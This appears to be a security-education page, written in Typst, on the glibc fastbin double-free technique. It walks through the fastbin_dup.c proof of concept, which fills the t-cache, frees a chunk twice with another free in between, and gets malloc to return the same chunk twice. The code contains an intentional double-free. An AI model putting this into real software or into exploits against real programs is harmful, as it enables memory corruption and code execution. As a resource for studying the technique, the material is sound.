#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "Fastbin Double-Free",
    description: "Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist.",
    date: "2025-12-13",
    order: 20,
  ),
)<frontmatter>

= Fastbin Double-Free Attack

== Introduction

This document demonstrates a double-free attack that abuses the fastbin freelist in the glibc allocator. By freeing the same chunk twice, we can corrupt the freelist and trick `malloc` into returning a pointer to an already-allocated chunk. This can lead to a write-what-where condition and potentially arbitrary code execution.

The example code is from `fastbin_dup.c`.

== Prerequisites
- *Double-Free Vulnerability*: The ability to call `free()` on the same memory region more than once, often via a dangling pointer.
- *T-cache Exhaustion*: On glibc 2.26 and later, the t-cache must be filled (typically with 7 chunks of the same size) to ensure subsequent frees go to the fastbins.
- *Interleaved Frees*: To bypass the fastbin's double-free check (which only verifies if the chunk being freed is at the top of the list), another chunk must be freed between the two `free()` calls of the target chunk.
- *Fastbin Size*: The chunk must be within the fastbin size range (typically `0x20` to `0x80` bytes on 64-bit systems).

== Example from `fastbin_dup.c`
- glibc version: 2.41 (latest)

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	void *ptrs[7];
	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	int *a = calloc(1, 8);
	int *b = calloc(1, 8);
	int *c = calloc(1, 8);

	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	free(a);
	free(b);

	// VULNERABILITY: Fastbin Double-Free
	free(a);

	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	a = malloc(8);
	b = calloc(1, 8);
	c = calloc(1, 8);

	assert(a == c);
	return 0;
}
```

== Attack Flow Explained

The attack proceeds in the following steps, which we'll visualize. We assume `malloc(8)` allocates a chunk of size `0x20` on a 64-bit system.

=== 1. Initial State & T-Cache Fill

First, three buffers `a`, `b`, and `c` are allocated. Then, to ensure subsequent frees go into the fastbin, we fill the t-cache for the `0x20` size by allocating and freeing 7 temporary chunks.

```c
int *a = calloc(1, 8);
int *b = calloc(1, 8);
int *c = calloc(1, 8);
// ...
for (int i=0; i<7; i++) {
    free(ptrs[i]);
}
```

#figure(
  table(
    columns: (auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Address*], [*Size*], [*Status*],
    [Let's assume `a` is at `0x1000`], `0x20`, [*Allocated*],
    [Let's assume `b` is at `0x1020`], `0x20`, [*Allocated*],
    [Let's assume `c` is at `0x1040`], `0x20`, [*Allocated*],
  ),
  caption: [Initial memory state after allocating a, b, and c.],
)

At this point, the t-cache for size `0x20` is full.

=== 2. The Double-Free

The core of the vulnerability is freeing a chunk twice to corrupt the fastbin freelist. A simple `free(a); free(a);` would be caught by glibc's double-free check. To bypass this, we interleave another free:

```c
free(a);
free(b);
/* VULNERABILITY */
free(a);
/* VULNERABILITY */
```

1. After `free(a)`, the fastbin freelist for size `0x20` is: `HEAD -> [ a ] -> NULL`
2. After `free(b)`, it becomes: `HEAD -> [ b ] -> [ a ] -> NULL`
3. After `free(a)` again, the check is bypassed because `a` is not the head of the list. The list becomes corrupted.

#figure(
  table(
    columns: auto,
    inset: 10pt,
    align: center,
    [*Corrupted Fastbin Freelist (size 0x20)*],
    [HEAD -> `a` (`0x1000`)],
    [FD -> `b` (`0x1020`)],
    [FD -> `a` (`0x1000`)],
    [FD -> ... (original content of a's FD)],
  ),
  caption: [The fastbin freelist after the double-free. It now contains `a` twice.],
)

The freelist effectively looks like `[ a, b, a ]`.

=== 3. Allocation leads to Duplication

Now, we need to allocate from the corrupted fastbin. First, the code empties the t-cache by allocating 7 chunks.

```c
for (int i = 0; i < 7; i++) {
    ptrs[i] = malloc(8);
}
```

With the t-cache exhausted, the next three allocations will be served from our corrupted fastbin:

```c
a = malloc(8);
b = calloc(1, 8);
c = calloc(1, 8);
```

1. The first allocation (`a = malloc(8)`) returns the chunk at `0x1000`. The fastbin list becomes `[ b, a ]`.
2. The second allocation (`b = calloc(1, 8)`) returns the chunk at `0x1020`. The fastbin list becomes `[ a ]`.
3. The third allocation (`c = calloc(1, 8)`) returns the chunk at `0x1000` *again*.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Variable*], [*Points To*], [*Status*], [*Note*],
    [`a` (new)], `0x1000`, [*Allocated*], [First allocation],
    [`b` (new)], `0x1020`, [*Allocated*], [Second allocation],
    [`c` (new)], `0x1000`, [*Allocated*], [Third allocation, points to same memory as `a`!],
  ),
  caption: [Final state: two pointers, `a` and `c`, point to the same chunk.],
)

The `assert(a == c)` at the end of the program confirms the success of the attack.

== Security Implications

This vulnerability allows an attacker to gain control over an allocated chunk. If the first user of the chunk (the code using pointer `a`) writes data, the second user (pointer `c`) can overwrite that data with malicious content, or vice-versa. This can lead to a variety of consequences, including data corruption, crashes, and, in more advanced exploits, control over the instruction pointer, leading to arbitrary code execution.
